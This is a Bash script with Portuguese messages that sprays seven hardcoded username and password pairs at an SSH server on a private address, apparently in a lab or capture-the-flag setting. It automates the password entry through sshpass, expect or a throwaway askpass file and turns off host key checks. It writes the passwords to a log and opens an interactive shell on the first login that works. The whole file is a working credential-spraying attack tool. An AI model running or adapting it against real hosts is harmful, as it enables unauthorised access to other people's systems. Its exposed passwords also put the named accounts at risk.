#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-10.20.20.57}"
SSH_BIN="${SSH_BIN:-/tmp/openssh-root/usr/bin/ssh}"
LOG_FILE="${LOG_FILE:-/tmp/ssh_pair_test_$(date +%F_%H%M%S).log}"

# Teste 1:1 com pares conhecidos (sem combinacao cruzada).
PAIRS=(
  "jonasf:minecraft123"
  "nickj:ZeqlcR2!4gN"
  "joshuaa:QW5al7oPN2-1"
  "joaos:F147-0356agipV"
  "leonardz:averylongpasswordfornohackertodiscover"
  "anneh:VSZ785-aWB15#q"
  "dmitrip:42W#wskb-62wA\$sc"
)

if [[ ! -x "${SSH_BIN}" ]]; then
  echo "[!] SSH nao encontrado em ${SSH_BIN}"
  echo "[i] Ajusta com: export SSH_BIN=/tmp/openssh-root/usr/bin/ssh"
  exit 1
fi

if ! command -v script >/dev/null 2>&1; then
  echo "[!] comando 'script' nao encontrado."
  exit 1
fi

SSH_METHOD=""
if command -v sshpass >/dev/null 2>&1; then
  SSH_METHOD="sshpass"
elif command -v expect >/dev/null 2>&1; then
  SSH_METHOD="expect"
elif command -v setsid >/dev/null 2>&1; then
  SSH_METHOD="askpass"
else
  SSH_METHOD="manual"
fi

touch "${LOG_FILE}" 2>/dev/null || LOG_FILE="/tmp/ssh_pair_test_fallback_$(date +%F_%H%M%S).log"
touch "${LOG_FILE}" 2>/dev/null || {
  echo "[!] Sem permissao para criar log. Vai rodar sem log em arquivo."
  LOG_FILE="/dev/null"
}

echo "[*] Target: ${TARGET}" | tee -a "${LOG_FILE}"
echo "[*] SSH_BIN: ${SSH_BIN}" | tee -a "${LOG_FILE}"
echo "[*] Log: ${LOG_FILE}" | tee -a "${LOG_FILE}"
echo "[*] Metodo de autenticacao: ${SSH_METHOD}" | tee -a "${LOG_FILE}"
echo "" | tee -a "${LOG_FILE}"

for pair in "${PAIRS[@]}"; do
  user="${pair%%:*}"
  pass="${pair#*:}"
  attempt_log="/tmp/ssh_pair_attempt_${user}_$$.log"

  echo "[*] Testando ${user} (1:1)" | tee -a "${LOG_FILE}"
  echo "[i] Enviando senha automaticamente para ${user}" | tee -a "${LOG_FILE}"

  if [[ "${SSH_METHOD}" == "manual" ]]; then
    echo "[!] Nem 'sshpass' nem 'expect' encontrados." | tee -a "${LOG_FILE}"
    echo "[i] Teste manual sugerido para ${user}:" | tee -a "${LOG_FILE}"
    echo "    ${SSH_BIN} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no ${user}@${TARGET}" | tee -a "${LOG_FILE}"
    echo "    senha: ${pass}" | tee -a "${LOG_FILE}"
    echo "" | tee -a "${LOG_FILE}"
    continue
  fi

  # Usa 'script' para forcar pseudo-tty no ambiente atual.
  # Executa comando curto para validar autenticacao.
  if [[ "${SSH_METHOD}" == "sshpass" ]]; then
    set +e
    script -q -c "SSHPASS='${pass}' sshpass -e ${SSH_BIN} \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o ConnectTimeout=5 \
      ${user}@${TARGET} 'whoami'" /dev/null >"${attempt_log}" 2>&1
    rc=$?
    set -e
  elif [[ "${SSH_METHOD}" == "expect" ]]; then
    set +e
    script -q -c "expect -c '
      log_user 1
      set timeout 8
      spawn ${SSH_BIN} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 ${user}@${TARGET} whoami
      expect {
        -re \"(?i)assword:\" { send \"${pass}\r\"; exp_continue }
        -re \"Permission denied\" { exit 2 }
        eof
      }
    '" /dev/null >"${attempt_log}" 2>&1
    rc=$?
    set -e
  elif [[ "${SSH_METHOD}" == "askpass" ]]; then
    askpass_script="/tmp/.askpass_${user}_$$.sh"
    cat >"${askpass_script}" <<EOF
#!/usr/bin/env bash
printf '%s\n' '${pass}'
EOF
    chmod 700 "${askpass_script}"

    set +e
    DISPLAY=:0 SSH_ASKPASS="${askpass_script}" SSH_ASKPASS_REQUIRE=force \
      setsid "${SSH_BIN}" \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o NumberOfPasswordPrompts=1 \
        -o ConnectTimeout=5 \
        "${user}@${TARGET}" "whoami" >"${attempt_log}" 2>&1
    rc=$?
    set -e

    rm -f "${askpass_script}"
  else
    echo "[!] Metodo de autenticacao nao suportado: ${SSH_METHOD}" | tee -a "${LOG_FILE}"
    rc=99
    : >"${attempt_log}"
  fi

  tee -a "${LOG_FILE}" <"${attempt_log}" >/dev/null

  if grep -qi "Permission denied" "${attempt_log}"; then
    echo "[-] Falhou para ${user}" | tee -a "${LOG_FILE}"
  elif [[ ${rc} -eq 0 ]]; then
    echo "[+] Possivel sucesso para ${user}" | tee -a "${LOG_FILE}"
    echo "[+] Abrindo sessao interativa..." | tee -a "${LOG_FILE}"
    if [[ "${SSH_METHOD}" == "sshpass" ]]; then
      exec SSHPASS="${pass}" sshpass -e "${SSH_BIN}" \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        "${user}@${TARGET}"
    else
      if [[ "${SSH_METHOD}" == "askpass" ]]; then
        askpass_script="/tmp/.askpass_${user}_$$.sh"
        cat >"${askpass_script}" <<EOF
#!/usr/bin/env bash
printf '%s\n' '${pass}'
EOF
        chmod 700 "${askpass_script}"
        echo "[i] Metodo 'askpass' detectado, abrindo sessao sem TTY interativo local." | tee -a "${LOG_FILE}"
        exec env DISPLAY=:0 SSH_ASKPASS="${askpass_script}" SSH_ASKPASS_REQUIRE=force \
          setsid "${SSH_BIN}" \
            -tt \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no \
            "${user}@${TARGET}"
      fi
      echo "[i] Como o metodo atual e 'expect', abrindo sessao manual para ${user}." | tee -a "${LOG_FILE}"
      echo "[i] Senha: ${pass}" | tee -a "${LOG_FILE}"
      exec "${SSH_BIN}" \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        "${user}@${TARGET}"
    fi
  else
    echo "[!] Resultado inconclusivo para ${user} (rc=${rc})" | tee -a "${LOG_FILE}"
  fi

  rm -f "${attempt_log}"
  echo "" | tee -a "${LOG_FILE}"
done

echo "[-] Nenhum par validado com sucesso."
echo "[i] Revisa o log: ${LOG_FILE}"
